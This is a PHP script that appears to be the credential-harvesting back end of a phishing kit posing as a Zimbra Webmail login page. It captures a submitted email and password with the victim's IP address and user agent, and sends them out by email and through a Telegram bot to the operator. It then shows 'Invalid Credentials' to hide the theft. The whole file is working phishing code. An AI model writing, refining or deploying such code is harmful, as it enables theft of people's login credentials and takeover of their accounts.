<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build message using heredoc for better readability
    $message = <<<EOT
|-----------|Zimbra Webmail|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

    // Email configuration
    $subject = "Login: {$ip}";
    
    // Send email
    mail($Receive_email, $subject, $message);

    // Telegram notification
    $encodedMessage = urlencode($message);
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendmessage?chat_id={$id}&text={$encodedMessage}";
    
    try {
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $telegramUrl,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10 // Add timeout to prevent hanging
        ]);

        $result = curl_exec($curl);
        
        if ($result && !curl_errno($curl)) {
            $signal = 'ok';
            $msg = 'Invalid Credentials';
        }
        
        curl_close($curl);
    } catch (Exception $e) {
        // Log error if needed
        error_log("Telegram API error: " . $e->getMessage());
    }
}